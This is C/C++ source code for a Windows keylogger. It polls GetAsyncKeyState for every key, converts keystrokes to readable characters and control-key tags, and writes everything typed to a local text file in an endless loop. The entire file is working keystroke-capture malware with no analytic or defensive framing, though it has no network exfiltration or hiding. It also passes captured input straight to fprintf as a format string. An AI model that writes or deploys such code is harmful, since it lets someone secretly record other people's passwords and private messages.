#include <stdio.h>
#include <windows.h>
#include "vk.h"

// a more human readable output
#define clean true

// log keys to a .txt file
#define dumpInTXTfile true

bool isShift() { return (((1 << 15) & GetAsyncKeyState(VK_SHIFT)) ? true : false); }
const char* CaptureKeyPress(const int& key) {
	
	switch (key) {
		case VK_KEY_A: { return (isShift() ? "A" : "a"); break; }
		case VK_KEY_B: { return (isShift() ? "B" : "b"); break; }
		case VK_KEY_C: { return (isShift() ? "C" : "c"); break; }
		case VK_KEY_D: { return (isShift() ? "D" : "d"); break; }
		case VK_KEY_E: { return (isShift() ? "E" : "e"); break; }
		case VK_KEY_F: { return (isShift() ? "F" : "f"); break; }
		case VK_KEY_G: { return (isShift() ? "G" : "g"); break; }
		case VK_KEY_H: { return (isShift() ? "H" : "h"); break; }
		case VK_KEY_I: { return (isShift() ? "I" : "i"); break; }
		case VK_KEY_J: { return (isShift() ? "J" : "j"); break; }
		case VK_KEY_K: { return (isShift() ? "K" : "k"); break; }
		case VK_KEY_L: { return (isShift() ? "L" : "l"); break; }
		case VK_KEY_M: { return (isShift() ? "M" : "m"); break; }
		case VK_KEY_N: { return (isShift() ? "N" : "n"); break; }
		case VK_KEY_O: { return (isShift() ? "O" : "o"); break; }
		case VK_KEY_P: { return (isShift() ? "P" : "p"); break; }
		case VK_KEY_Q: { return (isShift() ? "Q" : "q"); break; }
		case VK_KEY_R: { return (isShift() ? "R" : "r"); break; }
		case VK_KEY_S: { return (isShift() ? "S" : "s"); break; }
		case VK_KEY_T: { return (isShift() ? "T" : "t"); break; }
		case VK_KEY_U: { return (isShift() ? "U" : "u"); break; }
		case VK_KEY_V: { return (isShift() ? "V" : "v"); break; }
		case VK_KEY_W: { return (isShift() ? "W" : "w"); break; }
		case VK_KEY_X: { return (isShift() ? "X" : "x"); break; }
		case VK_KEY_Y: { return (isShift() ? "Y" : "y"); break; }
		case VK_KEY_Z: { return (isShift() ? "Z" : "z"); break; }
		
		case VK_KEY_1: { return (isShift() ? "!" : "1"); break; }
		case VK_KEY_2: { return (isShift() ? "@" : "2"); break; }
		case VK_KEY_3: { return (isShift() ? "#" : "3"); break; }
		case VK_KEY_4: { return (isShift() ? "$" : "4"); break; }
		case VK_KEY_5: { return (isShift() ? "%" : "5"); break; }
		case VK_KEY_6: { return (isShift() ? "^" : "6"); break; }
		case VK_KEY_7: { return (isShift() ? "&" : "7"); break; }
		case VK_KEY_8: { return (isShift() ? "*" : "8"); break; }
		case VK_KEY_9: { return (isShift() ? "(" : "9"); break; }
		case VK_KEY_0: { return (isShift() ? ")" : "0"); break; } 
		
		case VK_OEM_MINUS: { return (isShift() ? "_" : "-"); break; } 
		case VK_OEM_PLUS:  { return (isShift() ? "+" : "="); break; } 
		
		case VK_OEM_1: { return (isShift() ? ":"  : ";");  break; }
		case VK_OEM_2: { return (isShift() ? "?"  : "/");  break; }
		case VK_OEM_3: { return (isShift() ? "~"  : "`");  break; }
		case VK_OEM_4: { return (isShift() ? "{"  : "[");  break; }
		case VK_OEM_5: { return (isShift() ? "|"  : "\\"); break; }
		case VK_OEM_6: { return (isShift() ? "}"  : "]");  break; }
		case VK_OEM_7: { return (isShift() ? "\"" : "\'"); break; }
		
		case VK_OEM_COMMA:  { return (isShift() ? "<" : ","); break; } 
		case VK_OEM_PERIOD: { return (isShift() ? ">" : "."); break; } 
		
		case VK_ESCAPE: { return "[ESC]"; break; }
		case VK_SPACE:  { return " ";     break; }
		case VK_RETURN: { return (clean ? "\n" : "\\n"); break; }
		case VK_BACK:   { return (clean ? "\b" : "\\b"); break; }
		
		case VK_NUMLOCK: { return "[LOCK_NUM]"; break; }
		case VK_SCROLL:  { return "[LOCK_SCR]"; break; }
		case VK_CAPITAL: { return "[LOCK_CAP]"; break; }
		
		/*
		//shift
		case VK_SHIFT:  { return "[SHIFT]";  break; }
		case VK_LSHIFT: { return "[LSHIFT]"; break; }
		case VK_RSHIFT: { return "[RSHIFT]"; break; }
		*/
		
	    case VK_LCONTROL: { return "[LCTRL]"; break; }
		case VK_RCONTROL: { return "[RCTRL]"; break; }
		case VK_TAB:      { return "[TAB]";   break; }
		case VK_LMENU:    { return "[LALT]";  break; }
		case VK_RMENU:    { return "[RALT]";  break; }
		
		case VK_LWIN: { return "[LWIN]"; break; }
		case VK_RWIN: { return "[RWIN]"; break; }
		
		case VK_NUMPAD0:  { return "[N0]"; break; }
		case VK_NUMPAD1:  { return "[N1]"; break; }
		case VK_NUMPAD2:  { return "[N2]"; break; }
		case VK_NUMPAD3:  { return "[N3]"; break; }
		case VK_NUMPAD4:  { return "[N4]"; break; }
		case VK_NUMPAD5:  { return "[N5]"; break; }
		case VK_NUMPAD6:  { return "[N6]"; break; }
		case VK_NUMPAD7:  { return "[N7]"; break; }
		case VK_NUMPAD8:  { return "[N8]"; break; }
		case VK_NUMPAD9:  { return "[N9]"; break; }
		
		case VK_UP:    { return (clean ? "" : "[UP]"   ); break; } 
		case VK_DOWN:  { return (clean ? "" : "[DOWN]" ); break; }
		case VK_LEFT:  { return (clean ? "" : "[LEFT]" ); break; }
		case VK_RIGHT: { return (clean ? "" : "[RIGHT]"); break; }
		case VK_NEXT:  { return (clean ? "" : "[NEXT]" ); break; }
		case VK_PRIOR: { return (clean ? "" : "[PRIOR]"); break; }
		
		case VK_HOME:  { return "[HOME]"; break; }
		case VK_END:   { return "[END]" ; break; }
		
		case VK_DIVIDE:   { return "/"; break; }
		case VK_MULTIPLY: { return "*"; break; }
	    case VK_SUBTRACT: { return "-"; break; }
		case VK_ADD:      { return "+"; break; }
		case VK_DECIMAL:  { return "."; break; }
		
        case VK_F1:  { return "[F1]";  break; }
        case VK_F2:  { return "[F2]";  break; }
        case VK_F3:  { return "[F3]";  break; }
        case VK_F4:  { return "[F4]";  break; }
        case VK_F5:  { return "[F5]";  break; }
        case VK_F6:  { return "[F6]";  break; }
        case VK_F7:  { return "[F7]";  break; }
        case VK_F8:  { return "[F8]";  break; }
        case VK_F9:  { return "[F9]";  break; }
        case VK_F10: { return "[F10]"; break; }
        case VK_F11: { return "[F11]"; break; }
        case VK_F12: { return "[F12]"; break; }
        case VK_F13: { return "[F13]"; break; }
        case VK_F14: { return "[F14]"; break; }
        case VK_F15: { return "[F15]"; break; }
        case VK_F16: { return "[F16]"; break; }
        case VK_F17: { return "[F17]"; break; }
        case VK_F18: { return "[F18]"; break; }
        case VK_F19: { return "[F19]"; break; }
        case VK_F20: { return "[F20]"; break; }
        case VK_F21: { return "[F21]"; break; }
        case VK_F22: { return "[F22]"; break; }
        case VK_F23: { return "[F23]"; break; }
        case VK_F24: { return "[F24]"; break; }
		
		case VK_SNAPSHOT: { return "[PRTSC]";  break; }
		case VK_PAUSE:    { return "[PAUSE]";  break; }
		case VK_INSERT:   { return "[INSERT]"; break; }
		case VK_DELETE:   { return "[DEL]";    break; }
		case VK_SLEEP:    { return "[SLEEP]";  break; }
	}
	
	return NULL;
}


int main() {
	
	#if dumpInTXTfile
	FILE* f = fopen("file.txt", "w");
	if (f == NULL) {
		fprintf(stderr, "ERROR: failed to open txt file\n");
		return 1;
	}
	#endif
	
	bool run = true;
	while (run) {
		for (int i = 1; i <= 251; i++) {
			// -32767 = keydown
			// -32768 = keyup
			if (GetAsyncKeyState(i) == -32767) {
				const char* key = CaptureKeyPress(i);
				if (key == NULL) { continue; }
				printf("%s", key);
				#if dumpInTXTfile
				fprintf(f, key);
				#endif
				Sleep(10);
			}
		}
		#if dumpInTXTfile
		fflush(f);
		#endif
	}
	#if dumpInTXTfile
	fclose(f);
	#endif
	
	return 0;
}